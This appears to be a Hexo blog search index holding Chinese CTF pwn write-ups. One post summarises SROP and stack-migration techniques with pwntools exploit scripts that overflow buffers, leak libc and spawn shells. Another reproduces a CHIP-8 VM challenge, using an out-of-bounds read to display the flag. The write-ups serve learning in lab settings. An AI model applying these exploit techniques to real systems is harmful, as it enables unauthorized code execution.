<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Advanced Stack Summary</title>
    <link href="/2023/10/22/Stack/"/>
    <url>/2023/10/22/Stack/</url>
    
    <content type="html"><![CDATA[<p>高档栈题的一点点总结</p><span id="more"></span><h2 id="0x00-O-o">0x00 O.o</h2><p><s>一般的0x00是废话环节</s>…</p><p>前段时间有一天突然有种水平上不去下不来的感觉, 水平说高不高说低不低, 很奇怪, 跟前辈聊了聊, wings给了个建议是做个总结, 一想, 也没什么坏处, 于是写几个高档的栈题的点, 大概是3个, 迁移, srop, ret2dlresolve.</p><blockquote><p>癌症晚期了, 👴8💊当白银</p></blockquote><p>后续应该还会加点别的, 毕竟栈题这一块还是有不少的小的东西, 例如一些好玩的fmt.</p><blockquote><p>23.10.23：目前下面的题应该全是newstar week3的, week3的题很不错, 一道多次迁移, 一道srop, 一道rtdlr, 缺的营养这一块给补上来了, 饱饱的, <s>也正好是我写这个东西的原因</s></p></blockquote><h2 id="0x01-Srop">0x01 Srop</h2><blockquote><p><s>个人觉得是一个比较奇怪的东西</s>😔</p></blockquote><h3 id="原理">原理</h3><p>主要利用signal机制, linux下一个程序中断的机制, 中断时, 内核为保存程序的上下文, 将所有寄存器信息入栈.</p><p><strong>中断结束后, 内核将执行sigreturn系统调用, 根据之前入栈的信息将寄存器恢复, 由于该空间可写, 故可以被伪造, 并且由于内核将sigreturn的地址放在栈顶, 故利用时只需要将伪造的frame串放置于系统调用地址后方</strong></p><blockquote><p>其实这个地方不是很确定, 但是实际上很多情况下都是这么利用的, 应该就是因为实际上的frame就在那个地址的后方去达到伪造的作用的.</p><p><img src="https://image.3001.net/images/20151128/14487175105930.png!small" alt="image.png"></p><p>看过最近的几个题之后我觉得似乎确实就是这样的, 至于之前的题有可能出现不是紧邻, 感觉两种情况, 1是题的情况不同要具体分析, 2是<s>我是个猪鼻没看明白</s></p></blockquote><p>由于功能非常强大, 故只要有syscall, 有/bin/sh串 的地址, 可以构造出一次调用, 即可随意getshell, .并且如果一次不能getshell的话, 可以随意控制sp ip寄存器, 不必担心例如迁移, 初始化等等导致的栈环境变化, 这便导致了这种方法的杀伤力非常之强.</p><p>上周newstar里面的srop相对来说比较简单, 小移一次bp多构造一次read输入到可控的bss段即可.</p><blockquote><p><s>然后上周这个猪鼻因为frame里面系统调用号写成0x59以至于卡了半个晚上跑了, 我自己觉得是有点难绷的</s></p></blockquote><p>如果要多次利用, 将ip的位置指向syscall ret即可, 应该syscall函数也是可以的(我不知道我没试过), 总之pop一步ip将sp(也就是下一个构造好的sropframe地址)pop进ip即可.</p><h3 id="exp">exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./srop&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./srop&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>syscall=<span class="hljs-number">0x401040</span><br>bss=<span class="hljs-number">0x404500</span><br>leave=<span class="hljs-number">0x401171</span><br>rdiret=<span class="hljs-number">0x401203</span><br><br>srop1=SigreturnFrame()<br>srop1.rdi=<span class="hljs-number">59</span><br>srop1.rsi=bss-<span class="hljs-number">0x30</span><br>srop1.rdx=<span class="hljs-number">0</span><br>srop1.rcx=<span class="hljs-number">0</span><br>srop1.rsp=bss<br>srop1.rip=syscall<br><br><span class="hljs-comment">#debug()</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(leave)<br>r.sendline(payload)<br><br><span class="hljs-comment">#debug()</span><br>payload=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(rdiret)+p64(<span class="hljs-number">15</span>)+p64(syscall)+<span class="hljs-built_in">bytes</span>(srop1)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>感觉机制比较奇怪, 但是可能实际用起来意外的好用, <s>不是很懂你们内核的机制</s></p><h2 id="0x02-Migration">0x02 Migration</h2><p>这个知识点其实困扰了我个人很久, 因为迁移前后栈环境似乎会有很多微小的变化, 并且对于这种方法我始终有一种别扭的感觉在里面, 一到多次迁移就可能会在sp或者哪里出一些莫名其妙的问题.</p><h3 id="原理-v2">原理</h3><p>原理感觉很简单, 主要利用函数调用结束的一些规矩, rop实际在leave ret时发挥作用, 但是如果在栈空间过小以至于只够溢出不够使用时, 普遍使用重复leave ret将sp和bp拉走, 迁移到我们想要的位置, 诸如bss段/已知栈地址.</p><p>这是比较好懂的, 但是实际应用过程并不是很简单的在后面加一步leave ret, 很多时候输入次数不够, 常常选择先将bp拉走, 根据缓冲区以bp寻址的特点迁移布栈, 最后布栈完成一步leave ret将ip拉来开始执行.</p><p>例题有说是newstar week3的题.</p><h3 id="exp-v2">exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./mig&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./mig&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>putsplt=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>putsgot=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>bss=elf.bss()+<span class="hljs-number">0xa00</span><br>rdiret=<span class="hljs-number">0x4012b3</span><br>rbpret=<span class="hljs-number">0x40115d</span><br>leaveret=<span class="hljs-number">0x401227</span><br>ret=<span class="hljs-number">0x40101a</span><br>read=<span class="hljs-number">0x4011f3</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+p64(bss)+p64(read)<br>r.send(payload)<br><br><span class="hljs-comment">#debug()</span><br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=p64(rdiret)+p64(putsgot)+p64(putsplt)+p64(rbpret)+p64(bss+<span class="hljs-number">0x100</span>)+p64(read)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>payload+=p64(bss-<span class="hljs-number">0x58</span>)+p64(leaveret)<br>r.send(payload)<br><br>putsaddr=u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc=LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,putsaddr)<br>libcbase=putsaddr-libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>sysaddr=libcbase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binshaddr=libcbase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>gdb.attach(r)<br>pause()<br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=p64(rdiret)+p64(binshaddr)+p64(sysaddr)<br>payload+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(bss+<span class="hljs-number">0xa8</span>)+p64(leaveret)<br><br>r.send(payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>有个点需要注意, 在后续过程中很有可能sp会因为调用函数的时候开栈帧被拉回来, 由于0x1000页对齐, bss段其实是很大一部分, 如果偏移写少了拉回来就挂掉了, 所以迁bss的时候普遍要往更高地址迁, 诸如这个0xa00.</p><blockquote><p>这个题第一次迁移的时候要拉bp似乎也算是个特别的点.</p></blockquote><h2 id="0x03-ret2dlresolve">0x03 ret2dlresolve</h2><p>没怎么看懂, 过两天再看看往这补8🔨</p><blockquote><p>为了这盘醋包的饺子, 但是今天有点晚了, 小🕊️一手</p></blockquote><h2 id="0x04-Others">0x04 Others</h2><p>week3的时候, 周一晚上做第二道题能通本地不能通远程, 找了一晚上原因也不知道是为什么, 然后写srop, 写完卡在奇怪的系统调用上, <s>当时没发现是0x59的调用号</s>, 干脆跑了不做了, 然后这周搭博客+做一道vm+干了些别的事情就到今天, 倚着官方的wp从头到尾看了看自己没什么水平的栈, 突然意识到一个问题:</p><p>思维有点死, 例如那个srop我甚至没能想到多次利用程序已有的read输入, 做pwn原本应该多活跃一下思维去利用应有的东西的, 但是好像做的时候并没有想到可以拿一些片段性的程序出来用, 老毛病了, 再做题先晃晃脑袋.</p><blockquote><p>栈迁移的先迁bp再寻址读入拉sp也是前段时间才学到的</p></blockquote><p>不知道是不是做的题太少了, 还是最近就没怎么做这一类的灵活栈题, 堆题也没怎么做, 那我到底干啥了（x</p><p>除了学方法的同时, 感觉也要适当去哪里刷点题什么的, 最近要恢复刷各种比赛和buu, nss了.</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>Stack</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PWNmeCTF CHIP-8 复现</title>
    <link href="/2023/10/18/CHIP-8/"/>
    <url>/2023/10/18/CHIP-8/</url>
    
    <content type="html"><![CDATA[<p>这种VMpwn对带🔥来说刚刚好, 而对我这个♿就有丶超前🌶️😭</p><span id="more"></span><h2 id="0x00-材料">0x00 材料</h2><p>一个叫PWNME的比赛的一道题, 链接在这, 以下是照着wp算是复现的过程, 总之是看的想死😭</p><p><a href="https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/chip8">CHIP-8github原网址</a></p><h2 id="0x01-分析">0x01 分析</h2><p>拿来之后发现clone了一个仓库, 大致一看, 应该像是一个chip8语言的模拟器, 似乎也可以说是一个vm.</p><p>CHIP-8, 小查了一下:</p><p><a href="https://en.wikipedia.org/wiki/CHIP-8">https://en.wikipedia.org/wiki/CHIP-8</a></p><p><img src="image-20231018212805437.png" alt="image-20231018212805437"></p><blockquote><p><s>这个人的英语目前像屎所以还是要靠谷歌翻译x  x</s></p></blockquote><p>给了一个patch, 这个patch分析一下, 最主要的功能感觉应该就是<code>把flag扔进去</code>, 告诉你flag在这里了.</p><p>其次下面看着是调试性的语句也给加了点注释, 还有main函数里关闭缓冲的初始化性质语句.</p><p><strong>patch里面有关flag的部分是在Machine类里面, 看一下这个类</strong>:</p><ul><li><p>在<code>Machine.hpp</code>中, 定义了一堆莫名其妙的东西, 但是可以看懂有<code>register</code>, <code>stack</code>, <code>memory</code>这种很熟悉的字样, 具体联系这个维基百科稍微看看:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Machine</span>&#123;<br><span class="hljs-keyword">private</span>:<br>std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; registers; <span class="hljs-comment">// V0-VF</span><br>std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; memory; <span class="hljs-comment">// Memory</span><br>std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; flag;<br><span class="hljs-type">uint16_t</span> I; <span class="hljs-comment">// Index register</span><br>std::vector&lt;<span class="hljs-type">uint16_t</span>&gt; stack; <span class="hljs-comment">// Stack</span><br><span class="hljs-type">uint8_t</span> SP; <span class="hljs-comment">// Stack Pointer</span><br><span class="hljs-type">uint8_t</span> DT; <span class="hljs-comment">// Delay Timer</span><br><span class="hljs-type">uint8_t</span> ST; <span class="hljs-comment">// Sound Timer</span><br>GraphicEngine ge; <span class="hljs-comment">// Holds Graphics and frame buffer</span><br>Keyboard kb; <span class="hljs-comment">// presents Keyboard related functions</span><br><span class="hljs-type">uint16_t</span> PC; <span class="hljs-comment">// Program Counter</span><br>std::chrono::steady_clock::time_point last_tick;<br><br><span class="hljs-comment">// Methods</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">execute</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>&amp; opcode)</span></span>;<br><span class="hljs-function"><span class="hljs-type">uint8_t</span> <span class="hljs-title">random_byte</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_machine_state</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update_timers</span><span class="hljs-params">(<span class="hljs-type">const</span> std::chrono::steady_clock::time_point&amp; now)</span></span>;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Machine</span>();<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setInst</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">uint8_t</span>&gt;&amp; prog, <span class="hljs-type">uint16_t</span> start_addr)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">runLoop</span><span class="hljs-params">()</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="image-20231019180155003.png" alt="image-20231019180155003"></p></li></ul><p>对比看一下可以大致明白是个什么东西了, 感觉里面这个I应该是比较重要的东西之一</p><ul><li><p>然后是<code>Machine.cpp</code>,</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Machine::<span class="hljs-built_in">Machine</span>()&#123;<br>registers = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">16</span>, <span class="hljs-number">0</span>);<br>stack = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint16_t</span>&gt;(<span class="hljs-number">32</span>, <span class="hljs-number">0</span>);<br>memory = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">4096</span>, <span class="hljs-number">0</span>);<br>flag = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">128</span>, <span class="hljs-number">0</span>);<br>PC = <span class="hljs-number">0x200</span>;<br>last_tick = std::chrono::steady_clock::<span class="hljs-built_in">now</span>();<br>I = <span class="hljs-number">0</span>;<br>SP = <span class="hljs-number">0</span>;<br>DT = <span class="hljs-number">0</span>;<br>ST = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>这个应该是Machine的构造函数, 16个寄存器, 大小为32的栈和4096(0x1000)的内存, PC可以从上面知道是程序的计数器, 所以似乎是从0x200开始的.</p><p>内存过后直接是flag, 所以可能思路就是越界到flag</p><h2 id="0x02-过程-利用">0x02 过程+利用</h2><p>刚才把他到底是什么东西分析了个大概, 现在开始看怎么跑, 跑什么东西</p><p>给的dockerfile里面跑的是wrapper, wrapper实际跑一下, 感觉实际作用就是传入一个ROM code.</p><p>这个rom应该和 ↓应该是同一套的东西</p><p><img src="image-20231019190936098.png" alt="image-20231019190936098"></p><p>给了wrapper.c, 大概看了一下发现确实是这样的, 这个rom code会传进这一套文件里.</p><blockquote><p>在这里传进的ROMcode再分析一下会发现实际上应该也就是后续的opcode?但是不管怎样, 这里是唯一的输入了</p><p><strong>opcode</strong>应该算是控制vm的一些代码了, 这个题由于有着chip-8的背景, opcode可以说完全透明.</p></blockquote><p>漏洞和利用的话, 似乎这个题的漏洞相对来说属于很简单的, 根据分析可以知道flag就在内存块的后面, 所以应该是一个越界的漏洞, 但是实际上跑了一下, 发现除了一块黑框, 完全没有什么输出.</p><blockquote><p>之前没patch瞎鼓捣的时候发现会有一些信息出来, 但是patch过后如上面所说, 调试信息是关闭的, 打不出来东西, 起初我以为是我的步骤哪里出问题以至于把这玩意玩坏了,后来发现并不是这样.</p></blockquote><p>但是翻一下opcode表会发现有一个很奇怪的东西:</p><p><img src="image-20231019203235549.png" alt="image-20231019203235549"></p><p>于是这个题的flag的输出方式疑似是很匪夷所思的用这个黑框画出来, 这条opcode是从I开始读, 所以我们只需要让I等于我们的flag地址即可, flag地址是0x1010.</p><p>主要可以利用以下几个命令:</p><p><img src="image-20231019222825584.png" alt="image-20231019222825584"></p><p><img src="image-20231019222858938.png" alt="image-20231019222858938"></p><p><img src="image-20231019223158918.png" alt="image-20231019223158918"></p><p>这个地方直接拿百科上查到的了, 和在.cpp文件里看到的opcode几乎没有任何差别,</p><blockquote><p>然后找到一篇文章, <a href="https://ctftime.org/writeup/37026">CTFtime.org / PwnMe Qualifications : “8 bits” / chip8 / Writeup</a> , 疑似是官方的wp?</p><p>应该是个很不错的解释:</p></blockquote><ul><li><p>Here are the instruction we need:</p><ul><li><code>Annn</code> - <code>LD I, addr</code>. Set I = nnn. The value of register I is set to nnn.</li><li><code>6xkk</code> - <code>LD Vx, byte</code>, Set Vx = kk. The interpreter puts the value kk into register Vx.</li><li><code>Fx1E</code> - <code>ADD I, Vx</code>. Set I = I + Vx. The values of I and Vx are added, and the results are stored in I.</li><li><code>Dxyn</code> - <code>DRW Vx, Vy, nibble</code>. Display n-byte sprite starting at memory location I at (Vx, Vy), set VF = collision. The interpreter reads n bytes from memory, starting at the address stored in I. These bytes are then displayed as sprites on screen at coordinates (Vx, Vy). Sprites are XORed onto the existing screen. If this causes any pixels to be erased, VF is set to 1, otherwise it is set to 0. If the sprite is positioned so part of it is outside the coordinates of the display, it wraps around to the opposite side of the screen. See instruction 8xy3 for more information on XOR, and section 2.4, Display, for more information on the Chip-8 screen and sprites.</li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">n <span class="hljs-keyword">or </span>nibble - A <span class="hljs-number">4</span>-<span class="hljs-keyword">bit </span>value, the lowest <span class="hljs-number">4</span> <span class="hljs-keyword">bits </span>of the <span class="hljs-keyword">instruction</span><br><span class="hljs-keyword"></span>x - A <span class="hljs-number">4</span>-<span class="hljs-keyword">bit </span>value, the lower <span class="hljs-number">4</span> <span class="hljs-keyword">bits </span>of the high <span class="hljs-keyword">byte </span>of the <span class="hljs-keyword">instruction</span><br><span class="hljs-keyword"></span>y - A <span class="hljs-number">4</span>-<span class="hljs-keyword">bit </span>value, the upper <span class="hljs-number">4</span> <span class="hljs-keyword">bits </span>of the low <span class="hljs-keyword">byte </span>of the <span class="hljs-keyword">instruction</span><br><span class="hljs-keyword"></span>kk <span class="hljs-keyword">or </span><span class="hljs-keyword">byte </span>- An <span class="hljs-number">8</span>-<span class="hljs-keyword">bit </span>value, the lowest <span class="hljs-number">8</span> <span class="hljs-keyword">bits </span>of the <span class="hljs-keyword">instruction </span><br></code></pre></td></tr></table></figure></li></ul><p><img src="image-20231019224646952.png" alt="image-20231019224646952"></p><blockquote><p>这篇文章的写法, “由于I是16位寄存器, 故这个draw指令可以打印出xxx内存的东西”,自然包括0x1010</p></blockquote><h2 id="0x03-exp">0x03 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,endianness=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./wrapper&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./wrapper&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br>code=[<br>        <span class="hljs-number">0xafff</span>,                    <br>        <span class="hljs-number">0x6111</span> + <span class="hljs-number">0xf</span>*(),    <span class="hljs-comment"># 括号是偏移,一次打出0xf个字节</span><br>        <span class="hljs-number">0xf11e</span>,                    <br>        <span class="hljs-number">0xdbcf</span><br>        ]                     <br>romcode=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> code:<br>    romcode+=p16(i)<br><br><span class="hljs-built_in">print</span>(romcode)<br><br>r.sendline(romcode)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>分段改偏移, n位是f所以一次打0xf个字节的东西, 0xf乘以偏移改一下, 分次画flag就行了.</p><p>最后出现的结果大概like this(一共有4截):</p><p><img src="image-20231019225443175.png" alt="image-20231019225443175"></p><p>就是 这个东西:</p><p><img src="image-20231019225548366.png" alt="image-20231019225548366"></p><h2 id="0x04-后话">0x04 后话</h2><p>第一次系统的做了一整道VMpwn题, wings说普遍的vm题难度在逆向上, 这道题由于源码, opcode什么的全部给出, 并且利用是一个相对显而易见的越界, 所以<s>我事后</s>感觉这算是一个很简单的vm题, 只需要翻翻查查找到相关资料理解一下就行, 整个复现过程下来也稍微对vm题的过程有了一些实地感受, 要弄清楚内存, 寄存器等等东西的构造, 甚至可能还要理解opcode, <s>看着就像一个re人该做的事</s>, 更多偏向于读代码加调试, <s>听起来也比较烦人</s>😕</p><blockquote><p>唉 很简单的题 但一整篇都是溜着wp摸索下来的 我怎么这么菜啊😭</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>VM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2023 Diary</title>
    <link href="/2023/10/18/Evolution/"/>
    <url>/2023/10/18/Evolution/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bf4d68a6d5195ae7f5adf0c27f952b5da6a85c2d6cc233ed21743c407a380592"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">pswd↑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
